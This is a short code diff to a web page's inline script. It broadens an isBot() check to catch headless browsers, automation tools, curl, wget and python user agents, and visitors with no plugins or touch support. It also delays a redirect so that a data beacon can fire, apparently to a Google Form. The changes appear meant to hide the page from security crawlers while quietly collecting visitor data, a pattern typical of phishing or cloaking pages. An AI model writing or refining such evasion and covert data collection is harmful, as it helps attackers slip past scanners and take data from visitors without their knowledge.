@@ -29,10 +29,12 @@
 
     function isBot() {
       const ua = navigator.userAgent.toLowerCase();
-      return (
-        navigator.webdriver ||
-        /bot|crawl|spider|curl|wget|python|headless/i.test(ua)
-      );
+      const hasHeadlessProps = /headless|phantom|slimerjs|selenium|webdriver|puppeteer|crawl|spider|bot|curl|wget|python|scrapy/i.test(ua);
+      const noPlugins = navigator.plugins.length === 0;
+      const isAutomation = navigator.webdriver || window.chrome?.runtime === undefined;
+      const isTouchless = !('ontouchstart' in window);
+
+      return hasHeadlessProps || noPlugins || isAutomation || isTouchless;
     }
 
     function sendToGoogleForm(data) {
@@ -70,7 +72,10 @@
         ? "https://example.com"
         : "https://www.google.com/";
 
-      window.location.href = redirectUrl;
+      // Use slight delay to allow beacon to fire
+      setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 100);
     };
   </script>
 </head>
